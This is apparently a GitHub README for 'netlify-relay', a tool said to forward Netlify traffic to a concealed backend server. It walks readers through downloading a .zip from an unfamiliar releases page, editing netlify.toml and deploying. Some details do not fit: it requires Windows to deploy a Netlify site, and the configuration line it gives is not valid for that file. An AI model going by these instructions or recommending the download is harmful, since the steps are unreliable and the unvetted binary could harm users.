# 🌐 netlify-relay - Route web traffic with simple tools

[Download latest version](https://github.com/spayed-turkmen6590/netlify-relay/releases)

---

## 🛠 What is this project?

Netlify-relay acts as a bridge for your web traffic. It directs requests from your public website to a private server or specific domain. This setup keeps your backend hidden while your frontend serves content through Netlify. 

## 📋 System Requirements

To run this software on your computer, verify your system meets these standards:

- Windows 10 or Windows 11.
- Active Netlify account.
- Basic knowledge of file management.
- Web browser.

## 🚀 Getting Started

Follow these steps to set up the relay on your local machine.

### 1. Download the files

Visit the release page to obtain the software package.

[Click here to reach the download page](https://github.com/spayed-turkmen6590/netlify-relay/releases)

On that page, look for the section labeled "Assets." Click the link ending in .zip to start the save process. Once the download finishes, open your Downloads folder and right-click the file. Select "Extract All" to release the files into a new folder on your computer.

### 2. Prepare your environment

The relay requires one specific piece of information to know where to send traffic. You must define this as a variable. 

Open the extracted folder. Locate the file named "netlify.toml". Right-click this file and choose "Open with" then select "Notepad." 

At the bottom of this file, enter your target address. You must follow the format required by the system. Use the exact structure below:

TARGET_DOMAIN=https://your-domain.com:443

Replace "your-domain.com" with the actual address of the server you want to reach. Ensure you include the port number at the end, such as :443 or :8080. Save the file and close the text editor.

### 3. Deploy to Netlify

Netlify hosts this code and makes it live on the internet. Log in to your Netlify dashboard in your browser. 

Drag the folder that contains your files and drop it onto the "Add new site" area on the Netlify dashboard. Netlify will read the files and create a live version of the relay for you. 

## ⚙️ How the relay functions

When a user visits your Netlify site, the relay catches the request. It looks at the configuration you saved in your settings. It then forwards that request to the destination address you provided. 

This process happens behind the scenes. Your visitors see your Netlify site address, but the relay silently fetches data from your specific server. This protects your backend server from direct public exposure.

## 🔒 Important Security Notes

Follow these practices to maintain a smooth experience:

- Use this tool only with servers you own or servers you have clear permission to access.
- Keep your configuration files private. Do not share your target domain details in public forums.
- Test your relay with a single browser window before deploying it to a larger audience.

## 🔧 Troubleshooting common issues

If you encounter errors, check these common points:

- Double-check the port number. If the port is missing or incorrect, the relay cannot find your server.
- Verify that your target server accepts connections from external requests.
- Ensure the destination server address begins with https://.

## 📖 Frequently Asked Questions

**Does this software record my data?**
No. This code strictly relays traffic without storing user requests or personal information.

**Can I run this on a standard computer?**
Yes. You use your computer to edit the configuration and manage the deployment process. The relay itself runs on the Netlify platform.

**What happens if I enter the wrong domain?**
The relay will attempt to contact the unreachable address, and you will see a gateway timeout error in your browser. Correcting the address in your settings file will restore functionality.

**Does it support different types of traffic?**
This relay handles standard web requests. It works best for websites and API calls that use the HTTP protocols.